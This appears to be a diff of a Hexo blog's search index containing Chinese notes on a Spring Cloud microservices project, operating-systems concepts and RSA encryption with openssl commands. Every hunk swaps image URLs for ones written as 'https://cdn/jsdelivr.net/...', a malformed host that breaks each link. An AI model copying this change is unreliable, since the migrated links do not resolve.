&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Result</span><span class="params">(Boolean flag, Integer code, String message, Object data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.flag = flag;</span><br><span class="line">        <span class="keyword">this</span>.code = code;</span><br><span class="line">        <span class="keyword">this</span>.message = message;</span><br><span class="line">        <span class="keyword">this</span>.data = data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -5009,7 +5009,7 @@
 <p><a href="#1 IdWorker.java">附录/IdWorker.java</a></p>
 <p>tensquare_common工程创建util包，将IdWorker.java直接拷贝到<br>tensquare_common工程的util包中。</p>
 <p>不能使用数据库本身的自增功能来产生主键值，原因是生产环境为分片部署的。<br>使用snowflake （雪花）算法（twitter出品）生成唯一的主键值</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210616-scY29K.md.png" alt="scY29K.md.png"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210616-scY29K.md.png" alt="scY29K.md.png"></p>
 <ul>
 <li>41bit的时间戳可以支持该算法使用到2082年</li>
 <li>10bit的工作机器id可以支持1024台机器</li>
@@ -5614,7 +5614,7 @@
 </div>
 <h1 id="3-搭建消息通知微服务"><a href="#3-搭建消息通知微服务" class="headerlink" title="3 搭建消息通知微服务"></a>3 搭建消息通知微服务</h1><h2 id="3-1-业务分析"><a href="#3-1-业务分析" class="headerlink" title="3.1 业务分析"></a>3.1 业务分析</h2><p>用户可以对文章作者进行订阅，当被订阅的用户发布新的文章时，可以通过消息通知系统发送消息给订阅者。</p>
 <p>流程如下：</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210610-1563417873173.png" alt="1563359920194" style="zoom: 80%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210610-1563417873173.png" alt="1563359920194" style="zoom: 80%;" /></p>
 <h2 id="3-2-表结构分析"><a href="#3-2-表结构分析" class="headerlink" title="3.2 表结构分析"></a>3.2 表结构分析</h2><p>把资料中的sql脚本导入到数据库中，创建数据库和表。</p>
 <p>十次方消息通知微服务总共需要两张数据库表，tb_notice 和 tb_notice_fresh。</p>
 <ol>
@@ -5700,9 +5700,9 @@
 </li>
 </ol>
 <h2 id="4-2-新增文章群发消息"><a href="#4-2-新增文章群发消息" class="headerlink" title="4.2 新增文章群发消息"></a>4.2 新增文章群发消息</h2><p>新增文章后，需要通知订阅的用户，文章微服务需要调用消息通知微服务，创建消息。</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210616-20210615-image-20210615120826980.png" alt="13123"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210616-20210615-image-20210615120826980.png" alt="13123"></p>
 <p>用户登录十次方后，访问的前端页面，页面需要定时轮询通知接口，获取消息。（接口已完成）</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210615-1563608341301.png" alt="1563608148788"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210615-1563608341301.png" alt="1563608148788"></p>
 <ol>
 <li><p>新增NoticeClient，调用通知微服务</p>
 <p>pom.xml添加依赖</p>
@@ -5771,7 +5771,7 @@
     <url>/post/dbeddcc1.html</url>
     <content><![CDATA[<p>关于操作系统课的笔记<span id="more"></span></p>
 <h1 id="第1章-操作系统引论"><a href="#第1章-操作系统引论" class="headerlink" title="第1章 操作系统引论"></a>第1章 操作系统引论</h1><p>本章知识导图：</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210830-image-20210830164725870.png" alt="image-20210830164725870"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210830-image-20210830164725870.png" alt="image-20210830164725870"></p>
 <h2 id="1-1-操作系统的目标和作用"><a href="#1-1-操作系统的目标和作用" class="headerlink" title="1.1 操作系统的目标和作用"></a>1.1 操作系统的目标和作用</h2><p>操作系统是指控制和管理整个计算机系统的硬件和软件资源，并合理的组织调度计算机的工作和资源分配，以提供给用户和其他软件方便的接口和环境，它是计算机系统中最基本的系统软件。</p>
 <h3 id="1-1-1-操作系统的目标"><a href="#1-1-1-操作系统的目标" class="headerlink" title="1.1.1 操作系统的目标"></a>1.1.1 操作系统的目标</h3><p>在计算机系统上配置OS，其主要实现目标：方便性、有效性、可扩充性、开放性。</p>
 <ul>
@@ -5803,7 +5803,7 @@
 <p>OS处于用户与计算机硬件系统之间，用户通过OS来使用计算机硬件系统。</p>
 </li>
 </ol>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210830-image-20210830173840372.png" alt="image-20210830173840372"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210830-image-20210830173840372.png" alt="image-20210830173840372"></p>
 <ol>
 <li><p><strong>OS作为计算机系统资源的管理者</strong></p>
 <p>OS的主要功能就是对：处理机、存储器、I/O设备以及信息（数据和程序）的有效管理。</p>
@@ -5816,7 +5816,7 @@
 <p>在裸机上铺设的I/O软件，隐藏了I/O设备的具体细节，向上提供了一组抽象的I/O设备。</p>
 </li>
 </ol>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210830-image-20210830174400325.png" alt="image-20210830174400325"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210830-image-20210830174400325.png" alt="image-20210830174400325"></p>
 <h3 id="1-1-3-推动操作系统发展的主要动力"><a href="#1-1-3-推动操作系统发展的主要动力" class="headerlink" title="1.1.3 推动操作系统发展的主要动力"></a>1.1.3 推动操作系统发展的主要动力</h3><ol>
 <li><p><strong>不断提高计算机系统资源的利用率</strong></p>
 <p>计算机系统特别昂贵，提高计算机系统中各种资源的利用率成为了OS最初发展的推动力。由此促成了由单道批处理系统到多道批处理系统的演变，他通过减少计算机的空闲时间提高了系统中央处理机和I/O设备的利用率。</p>
@@ -5832,17 +5832,17 @@
 <li><p><strong>不断提出新的应用需求</strong></p>
 </li>
 </ol>
-<h2 id="1-2-操作系统的特征"><a href="#1-2-操作系统的特征" class="headerlink" title="1.2 操作系统的特征"></a>1.2 操作系统的特征</h2><h3 id="1-2-1-四个特征：并发、共享、虚拟、异步"><a href="#1-2-1-四个特征：并发、共享、虚拟、异步" class="headerlink" title="1.2.1 四个特征：并发、共享、虚拟、异步"></a>1.2.1 四个特征：并发、共享、虚拟、异步</h3><p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210915-image-20210915165004612.png" alt="image-20210915165004612" style="zoom: 67%;" /></p>
+<h2 id="1-2-操作系统的特征"><a href="#1-2-操作系统的特征" class="headerlink" title="1.2 操作系统的特征"></a>1.2 操作系统的特征</h2><h3 id="1-2-1-四个特征：并发、共享、虚拟、异步"><a href="#1-2-1-四个特征：并发、共享、虚拟、异步" class="headerlink" title="1.2.1 四个特征：并发、共享、虚拟、异步"></a>1.2.1 四个特征：并发、共享、虚拟、异步</h3><p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210915-image-20210915165004612.png" alt="image-20210915165004612" style="zoom: 67%;" /></p>
 <ol>
 <li><p><strong>并发</strong>：指两个或多个时间在同一时间间隔内发生。这些事件宏观上是同时发生的，但在微观上是交替发生的。并行：指两个或多个时间在同一时刻同时发生。</p>
 <p><strong>操作系统的并发性</strong>：指的是计算机系统中同时存在着多个运行着的程序。</p>
 </li>
 <li><p><strong>共享</strong>：指的是系统中的资源可供内存中多个并发执行的进程共同使用，资源共享。</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210915-image-20210915165506751.png" alt="image-20210915165506751" style="zoom:67%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210915-image-20210915165506751.png" alt="image-20210915165506751" style="zoom:67%;" /></p>
 </li>
 <li><p><strong>虚拟</strong>：把一个物理上的实体变为若干个逻辑上的对应物。物理实体（前者）是实际存在的，而逻辑上对应物（后者）是用户感受到的。</p>
 <p>虚拟技术：空分复用技术（虚拟存储技术）和时分复用技术（虚拟处理器技术）</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210915-image-20210915170220353.png" alt="image-20210915170220353" style="zoom:67%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210915-image-20210915170220353.png" alt="image-20210915170220353" style="zoom:67%;" /></p>
 </li>
 <li><p><strong>异步</strong>：再多道程序环境下，允许多个程序并发执行，但由于资源有限，进程的执行不是一贯到底的，而是走走停停，以不可预知的速度向前推进。</p>
 <p>如果失去了并发性，则系统只能串行的处理各个进程，每个进程的执行会一贯到底。==只有系统拥有并发性，才可能导致异步==</p>
@@ -5850,7 +5850,7 @@
 </ol>
 <h3 id="1-2-2-并发和共享的关系"><a href="#1-2-2-并发和共享的关系" class="headerlink" title="1.2.2 并发和共享的关系"></a>1.2.2 并发和共享的关系</h3><p>并发性：计算机系统中同时存在着多个运行着的程序</p>
 <p>共享性：系统中的资源可供内存中多个并发执行的进程共同使用。</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210915-image-20210915170004705.png" alt="image-20210915170004705" style="zoom:67%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210915-image-20210915170004705.png" alt="image-20210915170004705" style="zoom:67%;" /></p>
 <h2 id="1-3-操作系统的发展过程"><a href="#1-3-操作系统的发展过程" class="headerlink" title="1.3 操作系统的发展过程"></a>1.3 操作系统的发展过程</h2><p>20世纪50年代中期，出现了第一个简单的批处理系统。20世纪60年代中期，开发出了多道批处理系统，不久又推出了分时系统。与此同时，用于工业控制和武器控制的实时系统也相继问世。20世纪70—90年代，是VLSI和计算机体系结构大发展的年代，这一时期，微机、多处理机和计算机网络得以诞生并发展，相应地，也相继开发出了微机OS、多处理机OS、网络OS和分布式OS。OS得到了极为迅速的发展。</p>
 <h3 id="1-3-1-为配置操作系统的计算机系统"><a href="#1-3-1-为配置操作系统的计算机系统" class="headerlink" title="1.3.1 为配置操作系统的计算机系统"></a>1.3.1 为配置操作系统的计算机系统</h3><ol>
 <li><p><strong>人工操作方式</strong></p>
@@ -5858,7 +5858,7 @@
 </li>
 <li><p><strong>脱机I/O方式</strong></p>
 <p>事先将装有用户程序和数据的纸带装入纸带输入机，在一台外围机的控制下，把纸带上的程序和数据输入磁带。当CPU需要这些程序或数据时，再从磁带上将它们高速的调入内存。类似的，当CPU需要输出时，可先由CPU把数据直接从内存高速的送到磁带上，然后在另一台外围机的控制下，将磁带上的结果通过相应的输出设备输出。这种在外围机的控制下完成的是脱机I/O；而把在主机的直接控制下进行I/O的方式，为联机I/O方式。</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210906-image-20210906172256012.png" alt="image-20210906172256012"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210906-image-20210906172256012.png" alt="image-20210906172256012"></p>
 <p>这种脱机I/O的主要优点：</p>
 <p>（1）减少了CPU的空闲时间</p>
 <p>（2）提高了I/O的速度</p>
@@ -5868,7 +5868,7 @@
 <ol>
 <li><p><strong>单道批处理系统的处理过程</strong></p>
 <p>为了实现对作业的连续处理，需要先把一批作业以脱机IO方式输入到磁带上，并在系统中配上监督程序。在它的控制下，这批作业能一个接一个地被连续处理。处理过程:首先由监督程序将磁带上的第一个作业装入内存，并把运行控制权交给该作业;当该作业处理完成时，又把运行控制权交还给监督程序，再由监督程序把磁带上的第二个作业调入内存。计算机系统就这样自动地、一个作业紧接一个作业地进行处理，直至磁带上的所有作业全部完成，这样便形成了早期的批处理系统。虽然该系统对作业的处理是成批进行的，但在内存中始终只保持一道作业，故称之为单道批处理系统。图1-5所示为单道批处理系统的处理流程。</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210906-image-20210906172452708.png" alt="image-20210906172452708"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210906-image-20210906172452708.png" alt="image-20210906172452708"></p>
 </li>
 </ol>
 <ol>
@@ -5882,7 +5882,7 @@
 <h3 id="1-3-3-多道批处理系统"><a href="#1-3-3-多道批处理系统" class="headerlink" title="1.3.3 多道批处理系统"></a>1.3.3 多道批处理系统</h3><ol>
 <li><p><strong>多道程序设计的基本概念</strong></p>
 <p>为了进一步提高资源的利用率和系统吞吐量，在20世纪60年代中期引入了多道程序设计技术，由此形成了多道批处理系统。在该系统中，用户所提交的作业会被先存放在外存上，并排成一个队列，称为“后备队列”。然后由作业调度程序按一定的算法从后备队列中选择若干个作业调人内存，使它们共享CPU和系统中的各种资源。由于在内存中同时装有若干道程序，这样便可在运行程序A时，利用其因T/O操作而暂停执行时的CPU空档时间，再调度另一道程序B运行。同样可以利用程序B在IO操作时的CPU空档时间，再调度程序C运行，进而实现多道程序交替运行，这样便可以保持CPU处于忙碌状态。图1-7所示为4道程序的运行情况。</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210906-image-20210906172658252.png" alt="image-20210906172658252"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210906-image-20210906172658252.png" alt="image-20210906172658252"></p>
 </li>
 <li><p><strong>多道批处理系统的优缺点</strong></p>
 <p>主要优点：</p>
@@ -5974,7 +5974,7 @@
 操作系统内核\begin{cases}时钟管理：负责计时功能\\
 中断处理：负责实现中断机制\\
 原语\begin{cases}是一种特殊的程序\\处于操作系统最底层，是最接近硬件的部分\\这种程序的运行具有原子性—运行不可中断\\运行时间较短、调用频繁\end{cases}\\
-对系统资源进行管理\begin{cases}进程管理\\存储器管理\\设备管理\end{cases}\end{cases}</script><h3 id="1-4-2-体系结构"><a href="#1-4-2-体系结构" class="headerlink" title="1.4.2 体系结构"></a>1.4.2 体系结构</h3><p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210915-image-20210915175252471.png" alt="image-20210915175252471" style="zoom:67%;" /></p>
+对系统资源进行管理\begin{cases}进程管理\\存储器管理\\设备管理\end{cases}\end{cases}</script><h3 id="1-4-2-体系结构"><a href="#1-4-2-体系结构" class="headerlink" title="1.4.2 体系结构"></a>1.4.2 体系结构</h3><p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210915-image-20210915175252471.png" alt="image-20210915175252471" style="zoom:67%;" /></p>
 <script type="math/tex; mode=display">
 操作系统的体系结构\begin{cases}大内核\begin{cases}将操作系统的主要功能模块都作为系统内核，运行在核心态\\优点：高性能\\缺点：内核代码庞大，结构混乱，难以维护\end{cases}\\
 微内核\begin{cases}只把最基本的功能保留在内核\\优点：内核功能少，结构清晰，方便维护\\缺点：需要频繁地在核心态和用户态之间切换，性能低\end{cases}\end{cases}</script><h2 id="1-5-中断和异常"><a href="#1-5-中断和异常" class="headerlink" title="1.5 中断和异常"></a>1.5 中断和异常</h2><h3 id="1-5-1-中断"><a href="#1-5-1-中断" class="headerlink" title="1.5.1 中断"></a>1.5.1 中断</h3><ol>
@@ -6002,7 +6002,7 @@
 进程控制：完成进程的创建/撤销/阻塞/唤醒\\
 进程通信:完成进程之间的消息传递/信号传递\\
 内存管理:完成内存的分配与回收\end{cases}</script><h1 id="第2章-进程的描述与控制"><a href="#第2章-进程的描述与控制" class="headerlink" title="第2章 进程的描述与控制"></a>第2章 进程的描述与控制</h1><p>知识导图：</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210906-image-20210906175047130.png" alt="image-20210906175047130" style="zoom:80%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210906-image-20210906175047130.png" alt="image-20210906175047130" style="zoom:80%;" /></p>
 <h2 id="2-1-进程的定义"><a href="#2-1-进程的定义" class="headerlink" title="2.1 进程的定义"></a>2.1 进程的定义</h2><p>PCB：系统为每个运行的程序配置一个数据结构，称为进程控制块（PCB），用来描述进程的各种信息（如程序代码存放位置）。</p>
 <p>==PCB、程序段、数据段==组成了进程实体（进程映像）。所谓的创建进程，实质上使创建进程实体中的PCB；而撤销进程，实质上是撤销进程实体中的PCB。</p>
 <p>==PCB是进程存在的唯一标志！==</p>
@@ -6041,11 +6041,11 @@
 </ul>
 <p>创建进程：操作系统需要位进程分配资源，初始化PCB</p>
 <p>撤销进程：操作系统会回收进程拥有的资源、撤销PCB</p>
-<h3 id="2-2-2-进程状态的转换"><a href="#2-2-2-进程状态的转换" class="headerlink" title="2.2.2 进程状态的转换"></a>2.2.2 进程状态的转换</h3><p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210916-image-20210916154936259.png" alt="image-20210916154936259" style="zoom: 50%;" /></p>
+<h3 id="2-2-2-进程状态的转换"><a href="#2-2-2-进程状态的转换" class="headerlink" title="2.2.2 进程状态的转换"></a>2.2.2 进程状态的转换</h3><p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210916-image-20210916154936259.png" alt="image-20210916154936259" style="zoom: 50%;" /></p>
 <h2 id="2-3-进程控制"><a href="#2-3-进程控制" class="headerlink" title="2.3 进程控制"></a>2.3 进程控制</h2><ol>
 <li>进程控制的主要功能就是对系统中的所有进程实施有效的管理（实现进程状态的转化）</li>
 </ol>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210924-image-20210924085333763.png" alt="image-20210924085333763" style="zoom:50%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210924-image-20210924085333763.png" alt="image-20210924085333763" style="zoom:50%;" /></p>
 <ol>
 <li><p>原语要做的三类事情：</p>
 <ul>
@@ -6060,16 +6060,16 @@
 </ul>
 </li>
 <li><p>进程的创建</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210924-image-20210924085910391.png" alt="image-20210924085910391" style="zoom: 67%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210924-image-20210924085910391.png" alt="image-20210924085910391" style="zoom: 67%;" /></p>
 </li>
 <li><p>进程的终止</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210924-image-20210924090320815.png" alt="image-20210924090320815" style="zoom: 67%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210924-image-20210924090320815.png" alt="image-20210924090320815" style="zoom: 67%;" /></p>
 </li>
 <li><p>进程的阻塞/唤醒</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210924-image-20210924090535128.png" alt="image-20210924090535128" style="zoom:67%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210924-image-20210924090535128.png" alt="image-20210924090535128" style="zoom:67%;" /></p>
 </li>
 <li><p>进程的切换</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210924-image-20210924090647158.png" alt="image-20210924090647158" style="zoom:67%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210924-image-20210924090647158.png" alt="image-20210924090647158" style="zoom:67%;" /></p>
 </li>
 </ol>
 <h2 id="2-4-进程通信"><a href="#2-4-进程通信" class="headerlink" title="2.4 进程通信"></a>2.4 进程通信</h2><p>进程通信就是指进程之间的信息交换。进程是分配系统资源的单位，因此各进程拥有的==内存的地址空间==相互独立</p>
@@ -6304,7 +6304,7 @@
 <p>典型应用场景：离线的大量数据加密（用于存储的）</p>
 <p>常用的加密算法：<strong>DES</strong>、3DES、<strong>AES</strong>、TDEA、Blowfish、RC2、RC4、RC5、IDEA、SKIPJACK等。</p>
 <p>对称加密的工作过程如下图所示</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210608-image-20210607215642756.png" alt="image-20210607215642756" style="zoom: 67%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210608-image-20210607215642756.png" alt="image-20210607215642756" style="zoom: 67%;" /></p>
 <p>​    加密的安全性不仅取决于加密算法本身，密钥管理的安全性更是重要。如何把密钥安全地传递到解密者手上就成了必须要解决的问题。</p>
 <h3 id="5-2-3-非对称加密"><a href="#5-2-3-非对称加密" class="headerlink" title="5.2.3 非对称加密"></a>5.2.3 非对称加密</h3><p>​    非对称加密算法是一种<strong>密钥</strong>的保密方法，加密和解密使用两个不同的密钥，公开密钥（publickey:简称公钥）和私有密钥（privatekey:简称私钥）。公钥与私钥是一对，如果用公钥对数据进行加密，只有用对应的私钥才能解密。</p>
 <p>​    非对称加密算法的特点：</p>
@@ -6315,7 +6315,7 @@
 <p>经典应用场景：数字签名（私钥加密，公钥验证）</p>
 <p>常用的算法：<strong>RSA</strong>、Elgamal、背包算法、Rabin、D-H、ECC（椭圆曲线加密算法）。</p>
 <p>非对称加密算法示意图如下</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210608-%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%A4%BA%E6%84%8F%E5%9B%BE.jpg" alt="img" style="zoom:33%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210608-%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E7%A4%BA%E6%84%8F%E5%9B%BE.jpg" alt="img" style="zoom:33%;" /></p>
 <h3 id="5-2-4-数字签名"><a href="#5-2-4-数字签名" class="headerlink" title="5.2.4 数字签名"></a>5.2.4 数字签名</h3><p>​    数字签名（又称<a href="https://baike.baidu.com/item/公钥">公钥</a>数字签名）是一种类似写在纸上的普通的物理签名，是使用了公钥加密领域的技术实现，用于鉴别数字信息的方法。</p>
 <p>​    数字签名通常使用私钥生成签名，使用公钥验证签名。</p>
 <p>签名及验证过程：</p>
@@ -6326,7 +6326,7 @@
 <li>接收方再用发送方的公用密钥来对报文附加的数字签名进行解密</li>
 <li>如果这两个摘要相同、接收方就能确认该数字签名是发送方的。</li>
 </ol>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210608-%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E5%8F%8A%E9%AA%8C%E8%AF%81%E8%BF%87%E7%A8%8B.jpg" alt="img"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210608-%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D%E5%8F%8A%E9%AA%8C%E8%AF%81%E8%BF%87%E7%A8%8B.jpg" alt="img"></p>
 <p>数字签名验证的两个作用：</p>
 <ul>
 <li>确定消息确实是由发送方签名并发出来的</li>
@@ -6413,17 +6413,17 @@
 </ul>
 <h3 id="5-3-2-openssl生成rsa密钥对的命令"><a href="#5-3-2-openssl生成rsa密钥对的命令" class="headerlink" title="5.3.2 openssl生成rsa密钥对的命令"></a>5.3.2 openssl生成rsa密钥对的命令</h3><p>1.生成rsa私钥，文本存储格式，长度2048</p>
 <figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">openssl genrsa -<span class="keyword">out</span> ../mycerts/rsa_private_key.pem <span class="number">2048</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210608-image-20210608220437259.png" alt="image-20210608220437259" style="zoom:67%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210608-image-20210608220437259.png" alt="image-20210608220437259" style="zoom:67%;" /></p>
 <p>2.根据私钥生成对应的公钥</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">openssl rsa -<span class="keyword">in</span> ..<span class="regexp">/mycerts/</span>rsa_private_key.pem -pubout -out ..<span class="regexp">/mycerts/</span>rsa_public_key_2048.pub</span><br></pre></td></tr></table></figure>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210608-image-20210608220503047.png" alt="image-20210608220503047" style="zoom:67%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210608-image-20210608220503047.png" alt="image-20210608220503047" style="zoom:67%;" /></p>
 <p>3.私钥转化成pkcs8格式</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">openssl pkcs8 -topk8 -inform PEM -<span class="keyword">in</span> ..<span class="regexp">/mycerts/</span>rsa_private_key.pem -outform PEM -nocrypt &gt; ..<span class="regexp">/mycerts/</span>rsa_private_key_pkcs8.pem</span><br></pre></td></tr></table></figure>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210608-image-20210608220523521.png" alt="image-20210608220523521" style="zoom: 67%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210608-image-20210608220523521.png" alt="image-20210608220523521" style="zoom: 67%;" /></p>
 <p>然后再mycerts下查看密钥</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210609-image-20210609113654504.png" alt="image-20210609113654504" style="zoom:67%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210609-image-20210609113654504.png" alt="image-20210609113654504" style="zoom:67%;" /></p>
 <h2 id="5-4-搭建接口加密微服务"><a href="#5-4-搭建接口加密微服务" class="headerlink" title="5.4 搭建接口加密微服务"></a>5.4 搭建接口加密微服务</h2><p>接口加解密请求参数的流程</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210608-1563096130123.png" alt="1563096130123"></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210608-1563096130123.png" alt="1563096130123"></p>
 <h3 id="5-4-1-修改tensquare-parent"><a href="#5-4-1-修改tensquare-parent" class="headerlink" title="5.4.1 修改tensquare_parent"></a>5.4.1 修改tensquare_parent</h3><p>在十次方parent父工程pom.xml中添加SpringCloud依赖</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>       </span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>        </span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>      </span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>    </span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>Greenwich.SR1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>      </span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span>        </span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <h3 id="5-4-2-创建Eureka微服务"><a href="#5-4-2-创建Eureka微服务" class="headerlink" title="5.4.2 创建Eureka微服务"></a>5.4.2 创建Eureka微服务</h3><p>创建Maven工程tensquare_eureka，在pom.xml中添加以下依赖：</p>
@@ -6433,7 +6433,7 @@
 <p>编写启动类</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="comment">//开启eureka服务</span></span><br><span class="line"><span class="meta">@EnableEurekaServer</span></span><br><span class="line"><span class="comment">//防止启动url报错</span></span><br><span class="line"><span class="meta">@EnableAutoConfiguration(exclude=&#123;DataSourceAutoConfiguration.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EurekaApplication</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(EurekaApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>启动服务，并访问端口6868：</p>
-<p><img src="http://r9qthulqv.hd-bkt.clouddn.com/img/20210609-image-20210609133035783.png" alt="image-20210609133035783" style="zoom: 33%;" /></p>
+<p><img src="https://cdn/jsdelivr.net/gh/qnjy/giteeimg/img/20210609-image-20210609133035783.png" alt="image-20210609133035783" style="zoom: 33%;" /></p>
 <h3 id="5-4-3-修改文章微服务"><a href="#5-4-3-修改文章微服务" class="headerlink" title="5.4.3 修改文章微服务"></a>5.4.3 修改文章微服务</h3><p>在pom.xml中添加Eureka依赖</p>
 <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>    					<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.2.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
 <p>修改配置文件，使用Eureka</p>
@@ -6454,7 +6454,7 @@
